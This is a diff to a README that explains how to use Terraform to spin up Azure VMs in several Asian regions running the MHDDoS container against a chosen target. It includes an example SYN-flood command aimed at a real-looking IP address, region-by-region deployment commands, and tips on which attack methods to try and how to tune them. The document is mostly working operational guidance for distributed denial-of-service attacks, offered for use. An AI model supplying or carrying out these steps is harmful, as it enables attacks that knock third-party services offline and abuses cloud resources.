@@ -1,3 +1,5 @@
+>Note! You're free to use this repo a way you want but pay attention to the legal liability you may have if you use this 
+configuration without compliance with your local laws
 # Overview
 Here I use Terraform to automate Azure VM deployment which run MHDDOS docker container.
 You can deploy VMs to any Azure region, I prefer those that are located in Asia.   
@@ -6,7 +8,7 @@ You can deploy VMs to any Azure region, I prefer those that are located in Asia.
 - Default VM SKU - `Standard_F1s` (1 vCPU, 2 GiB RAM, accelerated networking - ON, price around 0.05 USD/hour)
 - Default resource group - `mhddosGroup`  
 
-To change default values you can amend the`variables.tf` file, to customize through terminal:
+To change default values you can amend the`variables.tf` file. To customize via terminal:
 ```shell
 terraform apply ... -var="<variableName>=<variableValue>"
 ```
@@ -52,8 +54,8 @@ az login
 ```shell
 terraform init
 ```
-5. Select target and type of attack by changing in `cloud-init.yaml` the `runcmd` attribute.  
-`docker run --name mhddos --rm -d djebos/mhddos:latest` command is static and mustn't be changed. All your 
+5. Select target and type of attack. Open the `cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
+`docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your 
 customizations must follow this command as in example below:
 
 ```yaml
@@ -62,7 +64,8 @@ runcmd:
   - docker run --name mhddos --rm -d djebos/mhddos:latest syn 15.61.23.9:53 100 999999
 # here 'syn 15.61.23.9:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
 ```
-More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
+More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)  
+Save the `cloud-init.yaml` file.
 
 6. Deploy to the specified azure region (you must be logged in through `az login`). Examples:  
 ```shell
@@ -70,7 +73,10 @@ terraform apply -state india.tfstate -var="location=southindia" -var="resource_g
 terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea" -auto-approve
 terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan" -auto-approve
 ```
-7. Verify after a couple of minutes on azure portal the load of VMs' CPUs. It must be around 100%
+7. Verify after a couple of minutes on azure portal the load of VMs' CPUs, RAM, network. CPU or RAM usage must be around 100%.  
+In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per connection count. 
+There isn't a silver bullet configuration and attack method that works perfectly on any target. You have to make some effort to figure out the best for every case. 
+Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`, `DNS`.  
 8. Stop attack and destroy VMs. Examples:
 ```shell
 terraform destroy -state india.tfstate -auto-approve
